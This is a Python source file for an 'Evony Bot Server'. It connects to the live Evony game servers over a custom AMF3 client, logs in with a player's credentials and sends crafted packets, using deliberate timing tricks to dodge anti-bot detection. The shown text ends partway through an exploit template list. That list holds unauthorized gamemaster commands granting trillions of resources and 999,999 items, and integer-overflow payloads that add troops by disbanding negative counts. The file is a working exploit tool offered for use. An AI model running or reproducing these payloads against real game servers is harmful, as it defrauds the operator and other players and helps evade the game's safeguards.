#!/usr/bin/env python3
"""
Evony Bot Server - Web Interface for Exploit Testing
Connects to Evony game server and sends custom AMF3 packets

Pure Python AMF3 implementation - no external dependencies!
"""

import socket
import struct
import threading
import json
import zlib
import hashlib
import ssl
from io import BytesIO
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import parse_qs, urlparse
import urllib.request
import xml.etree.ElementTree as ET
import time

def fetch_game_server_ip(server_name):
    """Fetch actual game server IP from config.xml"""
    try:
        url = f"http://{server_name}.evony.com/config.xml"
        req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
        resp = urllib.request.urlopen(req, timeout=10)
        xml_data = resp.read().decode()
        root = ET.fromstring(xml_data)
        server_ip = root.find('server').text
        port = root.find('port').text if root.find('port') is not None else '443'
        server_id = root.find('serverID').text
        return {
            'ip': server_ip,
            'port': int(port),
            'server_id': server_id,
            'config': xml_data
        }
    except Exception as e:
        return {'error': str(e)}

# ============================================================================
# PURE PYTHON AMF3 ENCODER/DECODER
# ============================================================================

class AMF3Types:
    UNDEFINED = 0x00
    NULL = 0x01
    FALSE = 0x02
    TRUE = 0x03
    INTEGER = 0x04
    DOUBLE = 0x05
    STRING = 0x06
    XML_DOC = 0x07
    DATE = 0x08
    ARRAY = 0x09
    OBJECT = 0x0A
    XML = 0x0B
    BYTEARRAY = 0x0C

class AMF3Encoder:
    """Pure Python AMF3 encoder"""
    
    def __init__(self):
        self.stream = BytesIO()
        self.string_refs = []
        self.object_refs = []
    
    def write_byte(self, b):
        self.stream.write(bytes([b & 0xFF]))
    
    def write_u29(self, n):
        """Write variable-length unsigned 29-bit integer"""
        n = n & 0x1FFFFFFF
        if n < 0x80:
            self.write_byte(n)
        elif n < 0x4000:
            self.write_byte((n >> 7) | 0x80)
            self.write_byte(n & 0x7F)
        elif n < 0x200000:
            self.write_byte((n >> 14) | 0x80)
            self.write_byte((n >> 7) | 0x80)
            self.write_byte(n & 0x7F)
        else:
            self.write_byte((n >> 22) | 0x80)
            self.write_byte((n >> 15) | 0x80)
            self.write_byte((n >> 8) | 0x80)
            self.write_byte(n & 0xFF)
    
    def write_string(self, s):
        """Write AMF3 string"""
        if s == "":
            self.write_u29(1)  # Empty string
            return
        
        # Check for reference
        if s in self.string_refs:
            ref = self.string_refs.index(s)
            self.write_u29(ref << 1)
            return
        
        # New string
        self.string_refs.append(s)
        encoded = s.encode('utf-8')
        self.write_u29((len(encoded) << 1) | 1)
        self.stream.write(encoded)
    
    def write_value(self, value):
        """Write any AMF3 value"""
        if value is None:
            self.write_byte(AMF3Types.NULL)
        elif value is True:
            self.write_byte(AMF3Types.TRUE)
        elif value is False:
            self.write_byte(AMF3Types.FALSE)
        elif isinstance(value, int):
            if -0x10000000 <= value < 0x10000000:
                self.write_byte(AMF3Types.INTEGER)
                self.write_u29(value & 0x1FFFFFFF)
            else:
                self.write_byte(AMF3Types.DOUBLE)
                self.stream.write(struct.pack('>d', float(value)))
        elif isinstance(value, float):
            self.write_byte(AMF3Types.DOUBLE)
            self.stream.write(struct.pack('>d', value))
        elif isinstance(value, str):
            self.write_byte(AMF3Types.STRING)
            self.write_string(value)
        elif isinstance(value, list):
            self.write_byte(AMF3Types.ARRAY)
            self.write_array(value)
        elif isinstance(value, dict):
            self.write_byte(AMF3Types.OBJECT)
            self.write_object(value)
        elif isinstance(value, bytes):
            self.write_byte(AMF3Types.BYTEARRAY)
            self.write_u29((len(value) << 1) | 1)
            self.stream.write(value)
        else:
            # Fallback: convert to string
            self.write_byte(AMF3Types.STRING)
            self.write_string(str(value))
    
    def write_array(self, arr):
        """Write AMF3 array"""
        self.write_u29((len(arr) << 1) | 1)
        self.write_string("")  # Empty associative portion
        for item in arr:
            self.write_value(item)
    
    def write_object(self, obj):
        """Write AMF3 object (anonymous/dynamic)"""
        # Anonymous dynamic object: traits = 0x0B (empty class name, dynamic)
        self.write_u29(0x0B)
        self.write_string("")  # Empty class name
        
        # Write dynamic properties
        for key, value in obj.items():
            self.write_string(str(key))
            self.write_value(value)
        
        # End of dynamic properties
        self.write_string("")
    
    def get_data(self):
        return self.stream.getvalue()


class AMF3Decoder:
    """Pure Python AMF3 decoder"""
    
    def __init__(self, data):
        self.stream = BytesIO(data)
        self.string_refs = []
        self.object_refs = []
        self.traits_refs = []
    
    def read_byte(self):
        b = self.stream.read(1)
        return b[0] if b else 0
    
    def read_u29(self):
        """Read variable-length unsigned 29-bit integer"""
        result = 0
        for i in range(4):
            b = self.read_byte()
            if i < 3:
                result = (result << 7) | (b & 0x7F)
                if not (b & 0x80):
                    break
            else:
                result = (result << 8) | b
        return result
    
    def read_string(self):
        """Read AMF3 string"""
        ref = self.read_u29()
        if (ref & 1) == 0:
            # Reference
            return self.string_refs[ref >> 1]
        
        length = ref >> 1
        if length == 0:
            return ""
        
        s = self.stream.read(length).decode('utf-8')
        self.string_refs.append(s)
        return s
    
    def read_value(self):
        """Read any AMF3 value"""
        type_marker = self.read_byte()
        
        if type_marker == AMF3Types.UNDEFINED:
            return None
        elif type_marker == AMF3Types.NULL:
            return None
        elif type_marker == AMF3Types.FALSE:
            return False
        elif type_marker == AMF3Types.TRUE:
            return True
        elif type_marker == AMF3Types.INTEGER:
            n = self.read_u29()
            if n & 0x10000000:
                n -= 0x20000000
            return n
        elif type_marker == AMF3Types.DOUBLE:
            return struct.unpack('>d', self.stream.read(8))[0]
        elif type_marker == AMF3Types.STRING:
            return self.read_string()
        elif type_marker == AMF3Types.ARRAY:
            return self.read_array()
        elif type_marker == AMF3Types.OBJECT:
            return self.read_object()
        elif type_marker == AMF3Types.BYTEARRAY:
            ref = self.read_u29()
            length = ref >> 1
            return self.stream.read(length)
        else:
            # Skip unknown types
            return f"<unknown type {type_marker}>"
    
    def read_array(self):
        """Read AMF3 array"""
        ref = self.read_u29()
        if (ref & 1) == 0:
            return self.object_refs[ref >> 1]
        
        length = ref >> 1
        result = []
        self.object_refs.append(result)
        
        # Read associative portion (skip)
        while True:
            key = self.read_string()
            if key == "":
                break
            self.read_value()
        
        # Read dense portion
        for _ in range(length):
            result.append(self.read_value())
        
        return result
    
    def read_object(self):
        """Read AMF3 object"""
        ref = self.read_u29()
        if (ref & 1) == 0:
            return self.object_refs[ref >> 1]
        
        result = {}
        self.object_refs.append(result)
        
        # Check traits
        traits_ref = ref >> 1
        if (traits_ref & 1) == 0:
            # Traits reference - simplified handling
            pass
        
        # Read class name
        class_name = self.read_string()
        
        is_dynamic = (ref >> 3) & 1
        sealed_count = ref >> 4
        
        # Read sealed properties (skip for now)
        for _ in range(sealed_count):
            self.read_string()
        
        # Read values for sealed properties
        for _ in range(sealed_count):
            self.read_value()
        
        # Read dynamic properties
        if is_dynamic:
            while True:
                key = self.read_string()
                if key == "":
                    break
                result[key] = self.read_value()
        
        return result


def amf3_encode(obj):
    """Encode object to AMF3 bytes"""
    encoder = AMF3Encoder()
    encoder.write_value(obj)
    return encoder.get_data()


def amf3_decode(data):
    """Decode AMF3 bytes to object"""
    decoder = AMF3Decoder(data)
    return decoder.read_value()


HAS_PYAMF = True  # We have our own implementation now!

# Global state
evony_client = None
packet_log = []
connected = False
discovered_data = {
    "castleIds": [],
    "heroIds": [],
    "questIds": [],
    "armyIds": [],
    "playerName": "",
    "allianceName": "",
    "resources": {},
    "heroes": [],
    "castles": []
}

class EvonyClient:
    """Handles connection to Evony game server with retry logic and anti-bot techniques"""
    
    def __init__(self):
        self.sock = None
        self.host = None
        self.port = None
        self.connected = False
        self.version = "091103_11"  # From EvonyVersion.as
        self.responses = []
        self.listener_thread = None
        self.running = False
        self.logged_in = False
        self.username = None
        self.player_data = None
        self.login_response = None
        self.version_ok = False
        self.last_error = None
        self.connection_attempts = 0
        self.login_attempts = 0
        
        # Anti-bot techniques from AutoEvony Connection.as and MasterTimer.as
        self.send_queue = []  # Queue commands like AutoEvony
        self.send_delay = 0.1  # 100ms between sends (sendTimer.delay when queue > 5)
        self.last_send_time = 0
        self.keepalive_interval = 300  # 5 minutes (connectionCheckTimer)
        self.last_packet_time = 0
        self.keepalive_thread = None
        self.queue_thread = None
        self.slot_delay = 25  # 25 seconds (MasterTimer slotSize) - CRITICAL for anti-bot
        self.initialized_session = False  # Track if session properly initialized
    
    def connect(self, host, port, username=None, password=None, max_retries=3):
        """Connect to Evony server with retry logic"""
        self.connection_attempts = 0
        self.last_error = None
        
        for attempt in range(1, max_retries + 1):
            self.connection_attempts = attempt
            try:
                # Clean up previous connection
                if self.sock:
                    try:
                        self.sock.close()
                    except:
                        pass
                
                self.connected = False
                self.running = False
                self.version_ok = False
                
                # Evony uses PLAIN TCP socket on the game server IP (from config.xml)
                # cc2.evony.com is web server, actual game server is in config.xml
                self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.sock.settimeout(10)
                
                log_entry = {
                    "type": "sent",
                    "cmd": f"[CONNECT ATTEMPT {attempt}/{max_retries}]",
                    "data": {"host": host, "port": port, "protocol": "TCP"},
                    "time": time.strftime("%H:%M:%S")
                }
                packet_log.append(log_entry)
                
                self.sock.connect((host, int(port)))
                self.host = host
                self.port = port
                self.connected = True
                self.running = True
                
                # Send version handshake
                self.send_packet("gameClient.version", self.version)
                
                # Start listener thread
                self.listener_thread = threading.Thread(target=self._listen_loop)
                self.listener_thread.daemon = True
                self.listener_thread.start()
                
                # Wait for version response
                time.sleep(1.0)
                
                # If credentials provided, attempt login with retry
                if username and password:
                    return self.login_with_retry(username, password, max_retries=3)
                
                return {
                    "status": "connected", 
                    "host": host, 
                    "port": port, 
                    "protocol": "TCP",
                    "attempt": attempt,
                    "note": "Use login to authenticate"
                }
                
            except socket.timeout:
                self.last_error = f"Connection timeout (attempt {attempt}/{max_retries})"
                log_entry = {
                    "type": "received",
                    "cmd": "[TIMEOUT]",
                    "data": {"attempt": attempt, "error": "Connection timed out"},
                    "time": time.strftime("%H:%M:%S")
                }
                packet_log.append(log_entry)
                
            except ssl.SSLError as e:
                self.last_error = f"SSL error: {str(e)}"
                log_entry = {
                    "type": "received",
                    "cmd": "[SSL ERROR]",
                    "data": {"attempt": attempt, "error": str(e)},
                    "time": time.strftime("%H:%M:%S")
                }
                packet_log.append(log_entry)
                
            except Exception as e:
                self.last_error = str(e)
                log_entry = {
                    "type": "received",
                    "cmd": "[CONNECTION ERROR]",
                    "data": {"attempt": attempt, "error": str(e)},
                    "time": time.strftime("%H:%M:%S")
                }
                packet_log.append(log_entry)
            
            # Wait before retry
            if attempt < max_retries:
                time.sleep(2)
        
        return {"status": "error", "message": self.last_error, "attempts": max_retries}
    
    def login_with_retry(self, username, password, max_retries=3):
        """Login with retry logic (1-3 attempts)"""
        self.login_attempts = 0
        self.logged_in = False
        self.login_response = None
        
        for attempt in range(1, max_retries + 1):
            self.login_attempts = attempt
            
            if not self.connected:
                return {"status": "error", "message": "Connection lost", "attempt": attempt}
            
            try:
                self.username = username
                # SHA1 hash the password (as per Evony client)
                pwd_hash = hashlib.sha1(password.encode()).hexdigest()
                
                login_data = {
                    "user": username,
                    "pwd": pwd_hash
                }
                
                log_entry = {
                    "type": "sent",
                    "cmd": f"[LOGIN ATTEMPT {attempt}/{max_retries}]",
                    "data": {"user": username, "pwd": "***SHA1***"},
                    "time": time.strftime("%H:%M:%S")
                }
                packet_log.append(log_entry)
                
                result = self.send_packet("login", login_data)
                
                # Wait for login response
                start_time = time.time()
                while time.time() - start_time < 5:  # 5 second timeout
                    if self.login_response is not None:
                        if self.login_response.get("ok", 0) == 1:
                            self.logged_in = True
                            return {
                                "status": "logged_in",
                                "user": username,
                                "attempt": attempt,
                                "player": self.login_response
                            }
                        else:
                            error_msg = self.login_response.get("errorMsg", "Login failed")
                            self.last_error = error_msg
                            break
                    
                    if not self.connected:
                        self.last_error = "Connection lost during login"
                        break
                    
                    time.sleep(0.2)
                
                # Check if we got any response
                if self.login_response is None:
                    self.last_error = f"No login response (attempt {attempt})"
                
            except Exception as e:
                self.last_error = str(e)
            
            log_entry = {
                "type": "received",
                "cmd": f"[LOGIN FAILED]",
                "data": {"attempt": attempt, "error": self.last_error},
                "time": time.strftime("%H:%M:%S")
            }
            packet_log.append(log_entry)
            
            # Wait before retry
            if attempt < max_retries:
                time.sleep(1)
        
        return {
            "status": "login_failed",
            "message": self.last_error or "Login failed after retries",
            "attempts": max_retries
        }
    
    def login(self, username, password):
        """Simple login (backward compatible)"""
        return self.login_with_retry(username, password, max_retries=3)
    
    def disconnect(self):
        """Disconnect from server"""
        self.running = False
        self.connected = False
        self.logged_in = False
        self.login_response = None
        self.version_ok = False
        if self.sock:
            try:
                self.sock.close()
            except:
                pass
        return {"status": "disconnected"}
    
    def send_packet(self, cmd, data, use_queue=False):
        """Send AMF3 packet to server with anti-bot timing from AutoEvony"""
        if not self.connected:
            return {"status": "error", "message": "Not connected"}
        
        try:
            # Anti-bot: Enforce minimum delay between sends (50-100ms like AutoEvony)
            current_time = time.time()
            time_since_last = current_time - self.last_send_time
            
            if time_since_last < self.send_delay:
                sleep_time = self.send_delay - time_since_last
                time.sleep(sleep_time)
            
            packet = {"cmd": cmd, "data": data}
            
            # Use our pure Python AMF3 encoder
            amf_data = amf3_encode(packet)
            
            # Prepend 4-byte length (big endian)
            length = struct.pack('>I', len(amf_data))
            
            self.sock.send(length + amf_data)
            self.last_send_time = time.time()
            self.last_packet_time = time.time()
            
            log_entry = {
                "type": "sent",
                "cmd": cmd,
                "data": data,
                "time": time.strftime("%H:%M:%S")
            }
            packet_log.append(log_entry)
            
            return {"status": "sent", "cmd": cmd, "size": len(amf_data)}
        except Exception as e:
            return {"status": "error", "message": str(e)}
    
    def send_with_slot_delay(self, cmd, data):
        """Send with MasterTimer-style slot delay for state-changing commands"""
        if not self.connected:
            return {"status": "error", "message": "Not connected"}
        
        # Wait slot_delay seconds before sending (like MasterTimer)
        time.sleep(self.slot_delay)
        return self.send_packet(cmd, data)
    
    def initialize_session(self, castle_id):
        """Send initialization packets like AutoEvony's initReqs()"""
        if not self.connected or not self.logged_in:
            return {"status": "error", "message": "Not logged in"}
        
        try:
            # AutoEvony sends these after login (from MainScreen.initReqs)
            # Wait 100ms like AutoEvony: Utils.callLater(100, this.initReqs)
            time.sleep(0.1)
            
            # Send quest.getQuestType commands
            self.send_packet("quest.getQuestType", {"castleId": castle_id, "type": 1})
            time.sleep(0.1)
            self.send_packet("quest.getQuestType", {"castleId": castle_id, "type": 4})
            time.sleep(0.1)
            
            self.initialized_session = True
            
            log_entry = {
                "type": "sent",
                "cmd": "[SESSION INITIALIZED]",
                "data": {"castleId": castle_id},
                "time": time.strftime("%H:%M:%S")
            }
            packet_log.append(log_entry)
            
            return {"status": "initialized", "castleId": castle_id}
        except Exception as e:
            return {"status": "error", "message": str(e)}
    
    def _recv_exact(self, n, timeout_ok=False):
        """Receive exactly n bytes from socket"""
        data = b''
        retries = 0
        max_retries = 30  # 30 seconds of waiting
        while len(data) < n:
            try:
                chunk = self.sock.recv(n - len(data))
                if not chunk:
                    return None  # Connection closed
                data += chunk
                retries = 0  # Reset on successful read
            except socket.timeout:
                retries += 1
                if data:
                    continue  # Keep trying if we have partial data
                if timeout_ok and retries < max_retries:
                    continue  # Keep waiting for data
                if retries >= max_retries:
                    return None  # Give up after too many timeouts
                return "timeout"  # Signal timeout vs disconnect
        return data
    
    def _listen_loop(self):
        """Background thread to receive server responses"""
        while self.running and self.connected:
            try:
                # Read 4-byte length header with timeout tolerance
                length_data = self._recv_exact(4, timeout_ok=True)
                
                # Handle timeout - just continue waiting
                if length_data == "timeout":
                    continue
                
                if not length_data:
                    log_entry = {
                        "type": "received",
                        "cmd": "[DISCONNECTED]",
                        "data": {"reason": "Server closed connection or no data"},
                        "time": time.strftime("%H:%M:%S")
                    }
                    packet_log.append(log_entry)
                    self.connected = False
                    break
                
                if len(length_data) < 4:
                    log_entry = {
                        "type": "received",
                        "cmd": "[PARTIAL DATA]",
                        "data": {"bytes": len(length_data), "hex": length_data.hex()},
                        "time": time.strftime("%H:%M:%S")
                    }
                    packet_log.append(log_entry)
                    continue
                
                length = struct.unpack('>I', length_data)[0]
                compressed = length & 0x80000000
                length = length & 0x7FFFFFFF
                
                if length > 1048576:  # MAX_PACKAGE_LEN
                    continue
                
                if length == 0:
                    continue
                
                # Read AMF data
                amf_data = b''
                while len(amf_data) < length:
                    chunk = self.sock.recv(min(4096, length - len(amf_data)))
                    if not chunk:
                        break
                    amf_data += chunk
                
                # Decompress if needed
                if compressed:
                    try:
                        amf_data = zlib.decompress(amf_data)
                    except:
                        pass
                
                # Decode AMF3 - try PyAMF first, fallback to pattern extraction
                response = None
                hex_str = amf_data.hex()
                
                def convert_amf_to_dict(obj, depth=0):
                    """Recursively convert PyAMF objects to Python dicts"""
                    if depth > 10:
                        return str(obj)
                    if obj is None:
                        return None
                    if isinstance(obj, (str, int, float, bool)):
                        return obj
                    if isinstance(obj, bytes):
                        return obj.hex()
                    if isinstance(obj, (list, tuple)):
                        return [convert_amf_to_dict(item, depth+1) for item in obj]
                    if hasattr(obj, 'keys'):
                        result = {}
                        for k in obj.keys():
                            result[str(k)] = convert_amf_to_dict(obj[k], depth+1)
                        return result
                    if hasattr(obj, '__iter__'):
                        return [convert_amf_to_dict(item, depth+1) for item in obj]
                    return str(obj)
                
                # Try PyAMF decoder
                try:
                    import pyamf
                    from pyamf import amf3
                    from pyamf.util import BufferedByteStream
                    buf = BufferedByteStream(amf_data)
                    decoder = amf3.Decoder(buf)
                    decoded = decoder.readElement()
                    response = convert_amf_to_dict(decoded)
                except Exception as e:
                    # Log PyAMF error for debugging
                    pass
                
                # Extract data from hex patterns - look for integer IDs
                extracted_data = {}
                
                # If PyAMF decoded successfully, extract castleId from response
                if response and isinstance(response, dict):
                    data = response.get('data', {})
                    if isinstance(data, dict):
                        cid = data.get('castleId')
                        if cid and isinstance(cid, (int, float)) and 1000 < cid < 10000000000:
                            extracted_data['castleId'] = int(cid)
                        # Look for player data with castles array
                        player = data.get('player', {})
                        if isinstance(player, dict):
                            castles = player.get('castles', [])
                            if isinstance(castles, list):
                                for castle in castles:
                                    if isinstance(castle, dict):
                                        cid = castle.get('id')
                                        if cid and isinstance(cid, (int, float)) and 1000 < cid < 10000000000:
                                            extracted_data['castleId'] = int(cid)
                                            break
                
                # Command pattern matching
                cmd_patterns = {
                    '4c6f67696e526573706f6e7365': 'server.LoginResponse',
                    '5265736f75726365557064617465': 'server.ResourceUpdate',
                    '4865726f557064617465': 'server.HeroUpdate',
                    '7a6f6e65496e666f': 'common.zoneInfo',
                    '676574506c61796572496e666f': 'common.getPlayerInfoByName',
                    '6765744865726f734c697374': 'hero.getHerosListFromTavern',
                    '676574466c65654865726f4c697374': 'hero.getFleeHeroList',
                    '67657450726f6475636551756575': 'troop.getProduceQueue',
                    '676574496e6a757265645472': 'army.getInjuredTroop',
                    '676574466c6565547265': 'army.getFleeTroop',
                    '6765745374617941': 'army.getStayAllianceArmys',
                    '67657453746f72654c697374': 'city.getStoreList',
                    '676574417661696c61626c654275696c64': 'castle.getAvailableBuildingList',
                    '55706461746543617374': 'castle.UpdateCastleResources',
                    '6765744e7063486572': 'npchero.getNpcHerosList',
                    '6d6170496e666f': 'common.mapInfo',
                    '4b69636b65644f7574': 'server.KickedOut',
                }
                
                extracted_cmd = None
                for pattern, cmd_name in cmd_patterns.items():
                    if pattern in hex_str:
                        extracted_cmd = cmd_name
                        break
                
                # Build response if PyAMF failed
                if not response or not isinstance(response, dict):
                    if extracted_cmd:
                        response = {"cmd": extracted_cmd, "data": extracted_data, "raw": hex_str[:300]}
                        if extracted_cmd == 'server.LoginResponse':
                            if '6c6f67696e2073756363657373' in hex_str:
                                response["data"]["ok"] = 1
                                response["data"]["msg"] = "login success"
                            else:
                                response["data"]["ok"] = 0
                    else:
                        response = {"cmd": "[RESPONSE]", "data": extracted_data, "raw": hex_str[:200]}
                else:
                    # Merge extracted data into response
                    if 'data' not in response:
                        response['data'] = extracted_data
                    elif isinstance(response.get('data'), dict):
                        response['data'].update(extracted_data)
                
                # Extract command from response
                cmd = None
                if isinstance(response, dict):
                    cmd = response.get("cmd", "")
                    data = response.get("data", {})
                    
                    # Check for login response - extract player data
                    if cmd == "server.LoginResponse" or "LoginResponse" in str(cmd):
                        self.login_response = data if isinstance(data, dict) else response
                        if self.login_response.get("ok") == 1:
                            self.logged_in = True
                            player = self.login_response.get("player", {})
                            self.player_data = player
                            # Extract all player data
                            if isinstance(player, dict):
                                discovered_data["playerName"] = player.get("playerInfo", {}).get("userName", "") if isinstance(player.get("playerInfo"), dict) else ""
                                
                                # Extract castles and heroes from each castle
                                castles = player.get("castles", [])
                                if isinstance(castles, list):
                                    for castle in castles:
                                        if isinstance(castle, dict):
                                            cid = castle.get("id") or castle.get("castleId")
                                            if cid and cid not in discovered_data["castleIds"]:
                                                discovered_data["castleIds"].append(cid)
                                                discovered_data["castles"].append(castle)
                                            
                                            # Extract heroes from castle.heros array (AutoEvony: herosArray)
                                            heroes = castle.get("heros", []) or castle.get("herosArray", [])
                                            if isinstance(heroes, list):
                                                for hero in heroes:
                                                    if isinstance(hero, dict):
                                                        hid = hero.get("id") or hero.get("heroId")
                                                        if hid and hid not in discovered_data["heroIds"]:
                                                            discovered_data["heroIds"].append(hid)
                                                            discovered_data["heroes"].append(hero)
                                
                                # Extract items from player
                                items = player.get("items", [])
                                if isinstance(items, list):
                                    for item in items:
                                        if isinstance(item, dict):
                                            iid = item.get("id") or item.get("itemId")
                                            if iid:
                                                discovered_data.setdefault("items", []).append(item)
                    
                    # Extract data from any response with castleId
                    if isinstance(data, dict):
                        # Look for castleId in response
                        cid = data.get("castleId") or data.get("id")
                        if cid and cid not in discovered_data["castleIds"]:
                            discovered_data["castleIds"].append(cid)
                    
                    # Also check extracted_data from hex parsing
                    if extracted_data.get("castleId"):
                        cid = extracted_data["castleId"]
                        if cid not in discovered_data["castleIds"]:
                            discovered_data["castleIds"].append(cid)
                    
                    # Look for heroes in response
                    if isinstance(data, dict):
                        heroes = data.get("heroes") or data.get("heroList") or data.get("heros")
                        if isinstance(heroes, list):
                            for hero in heroes:
                                if isinstance(hero, dict):
                                    hid = hero.get("id") or hero.get("heroId")
                                    if hid and hid not in discovered_data["heroIds"]:
                                        discovered_data["heroIds"].append(hid)
                                        discovered_data["heroes"].append(hero)
                        
                        # Look for quests
                        quests = data.get("quests") or data.get("questList")
                        if isinstance(quests, list):
                            for quest in quests:
                                if isinstance(quest, dict):
                                    qid = quest.get("id") or quest.get("questId")
                                    if qid and qid not in discovered_data["questIds"]:
                                        discovered_data["questIds"].append(qid)
                        
                        # Look for armies
                        armies = data.get("armies") or data.get("armyList")
                        if isinstance(armies, list):
                            for army in armies:
                                if isinstance(army, dict):
                                    aid = army.get("id") or army.get("armyId")
                                    if aid and aid not in discovered_data["armyIds"]:
                                        discovered_data["armyIds"].append(aid)
                    
                    # Check for version response
                    if "version" in str(cmd).lower():
                        self.version_ok = True
                    
                    # Check for kicked out
                    if cmd == "server.KickedOut":
                        self.logged_in = False
                        self.connected = False
                
                log_entry = {
                    "type": "received",
                    "cmd": cmd or "[RESPONSE]",
                    "data": str(response)[:500] if response else "empty",
                    "time": time.strftime("%H:%M:%S")
                }
                packet_log.append(log_entry)
                self.responses.append(response)
                
            except socket.timeout:
                continue
            except Exception as e:
                if self.running:
                    log_entry = {
                        "type": "received",
                        "cmd": "[LISTENER ERROR]",
                        "data": {"error": str(e)},
                        "time": time.strftime("%H:%M:%S")
                    }
                    packet_log.append(log_entry)
                break
        
        self.connected = False


# Exploit payload templates
# STATUS KEY:
#   ✅ WORKS - Command executes successfully
#   ❌ BLOCKED - Server rejects with "Invalid request" (ok=-99)
#   ⚠️ UNTESTED - Needs testing
EXPLOIT_TEMPLATES = {
    # ============ ✅ WORKING DISCOVERY COMMANDS ============
    "get_player_info": {
        "name": "✅ Get Player Info",
        "cmd": "common.getPlayerInfoByName",
        "data": {"userName": "Siren"},
        "description": "Get player info - WORKS",
        "category": "discovery",
        "status": "working"
    },
    "get_zone_info": {
        "name": "🔍 Get Zone Info",
        "cmd": "common.zoneInfo",
        "data": {},
        "description": "Get zone/server information",
        "category": "discovery"
    },
    "get_hero_list": {
        "name": "🔍 Get Hero List (Tavern)",
        "cmd": "hero.getHerosListFromTavern",
        "data": {"castleId": 0},
        "description": "Get list of heroes in tavern",
        "category": "discovery"
    },
    "get_flee_hero_list": {
        "name": "🔍 Get Flee Hero List",
        "cmd": "hero.getFleeHeroList",
        "data": {"castleId": 0},
        "description": "Get list of fled heroes",
        "category": "discovery"
    },
    "get_troop_queue": {
        "name": "🔍 Get Troop Queue",
        "cmd": "troop.getProduceQueue",
        "data": {"castleId": 0},
        "description": "Get troop production queue",
        "category": "discovery"
    },
    "get_injured_troops": {
        "name": "🔍 Get Injured Troops",
        "cmd": "army.getInjuredTroop",
        "data": {"castleId": 0},
        "description": "Get injured troop counts",
        "category": "discovery"
    },
    "get_flee_troops": {
        "name": "🔍 Get Flee Troops",
        "cmd": "army.getFleeTroop",
        "data": {"castleId": 0},
        "description": "Get fled troop counts",
        "category": "discovery"
    },
    "get_my_armies": {
        "name": "🔍 Get My Armies",
        "cmd": "army.getStayAllianceArmys",
        "data": {"castleId": 0},
        "description": "Get all armies stationed",
        "category": "discovery"
    },
    "get_troop_params": {
        "name": "🔍 Get Troop Params",
        "cmd": "army.getTroopParam",
        "data": {"castleId": 0},
        "description": "Get troop parameters",
        "category": "discovery"
    },
    "get_store_list": {
        "name": "🔍 Get Store List",
        "cmd": "city.getStoreList",
        "data": {"castleId": 0},
        "description": "Get warehouse/store contents",
        "category": "discovery"
    },
    "get_buildings": {
        "name": "🔍 Get Buildings Inside",
        "cmd": "castle.getAvailableBuildingListInside",
        "data": {"castleId": 0},
        "description": "Get inner city buildings",
        "category": "discovery"
    },
    "get_buildings_outside": {
        "name": "🔍 Get Buildings Outside",
        "cmd": "castle.getAvailableBuildingListOutside",
        "data": {"castleId": 0},
        "description": "Get outer city buildings",
        "category": "discovery"
    },
    "update_resources": {
        "name": "🔍 Update Resources",
        "cmd": "castle.UpdateCastleResources",
        "data": {"castleId": 0},
        "description": "Refresh resource counts",
        "category": "discovery"
    },
    "get_npc_heroes": {
        "name": "🔍 Get NPC Heroes List",
        "cmd": "npchero.getNpcHerosList",
        "data": {"castleId": 0},
        "description": "Get list of NPC heroes",
        "category": "discovery"
    },
    "get_map_info": {
        "name": "🔍 Get Map Info",
        "cmd": "common.mapInfo",
        "data": {"castleId": 0, "x1": 90, "y1": 700, "x2": 100, "y2": 710},
        "description": "Get map tiles in area",
        "category": "discovery"
    },
    # ============ 🔴 GAMEMASTER COMMANDS - SET RESOURCES & TROOPS ============
    # These are admin-level commands that directly set values
    "gm_set_resources_max": {
        "name": "💎 GM: SET MAX RESOURCES (5T each, 900B food)",
        "cmd": "gamemaster.setResources",
        "data": {
            "castleId": 1335129,
            "wood": 5000000000000,      # 5 trillion
            "iron": 5000000000000,      # 5 trillion  
            "stone": 5000000000000,     # 5 trillion
            "food": 900000000000,       # 900 billion (max before flip)
            "gold": 5000000000000,      # 5 trillion
            "population": 999999999     # Max population
        },
        "description": "GAMEMASTER: Set 5T wood/iron/stone/gold, 900B food (max before flip)",
        "category": "gamemaster",
        "status": "critical"
    },
    "gm_add_items": {
        "name": "💎 GM: ADD ITEMS",
        "cmd": "gamemaster.addItems",
        "data": {"type": "player.box.gambling.3", "amount": 999999},
        "description": "GAMEMASTER: Add 999,999 of any item type",
        "category": "gamemaster",
        "status": "critical"
    },
    "gm_set_technology": {
        "name": "💎 GM: MAX TECHNOLOGY",
        "cmd": "gamemaster.setTechnology",
        "data": {"technologyType": 0, "level": 10},
        "description": "GAMEMASTER: Set technology to max level",
        "category": "gamemaster",
        "status": "critical"
    },
    # ============ 🔴 TROOP FLIP EXPLOITS - NEGATIVE TO POSITIVE ============
    # Troops flip at INT32 (2,147,483,647) to negative. Flip again to positive!
    "flip_negative_troops": {
        "name": "🔄 FLIP NEGATIVE TROOPS → POSITIVE",
        "cmd": "troop.disbandTroop",
        "data": {"castleId": 1335129, "troopType": 6, "num": -2147483648},
        "description": "CRITICAL: Disband NEGATIVE troops = ADD troops! Flips -2.1B to positive",
        "category": "troop_flip",
        "status": "critical"
    },
    "disband_negative_archer": {
        "name": "🔄 DISBAND -2B ARCHERS (ADDS TROOPS)",
        "cmd": "troop.disbandTroop",
        "data": {"castleId": 1335129, "troopType": 6, "num": -2000000000},
        "description": "Disband negative number = ADD troops. -2B disbands = +2B gained",
        "category": "troop_flip",
        "status": "critical"
    },
    # Train to exactly 2B troops (under INT32 limit)
    "train_2b_workers": {
        "name": "⚔️ TRAIN 2B WORKERS",
        "cmd": "troop.produceTroop",
        "data": {"castleId": 1335129, "troopType": 1, "num": 2000000000},
        "description": "Train 2,000,000,000 workers (under INT32 limit)",
        "category": "mass_troops",
        "status": "critical"
    },
    "train_2b_archers": {
        "name": "⚔️ TRAIN 2B ARCHERS",
        "cmd": "troop.produceTroop",
        "data": {"castleId": 1335129, "troopType": 6, "num": 2000000000},
        "description": "Train 2,000,000,000 archers (under INT32 limit)",
        "category": "mass_troops",
        "status": "critical"
    },
    "train_2b_cavalry": {
        "name": "⚔️ TRAIN 2B CAVALRY",
        "cmd": "troop.produceTroop",
        "data": {"castleId": 1335129, "troopType": 9, "num": 2000000000},
        "description": "Train 2,000,000,000 cavalry (under INT32 limit)",
        "category": "mass_troops",
        "status": "critical"
    },
    "train_2b_catapults": {
        "name": "⚔️ TRAIN 2B CATAPULTS",
        "cmd": "troop.produceTroop",
        "data": {"castleId": 1335129, "troopType": 12, "num": 2000000000},
        "description": "Train 2,000,000,000 catapults (under INT32 limit)",
        "category": "mass_troops",
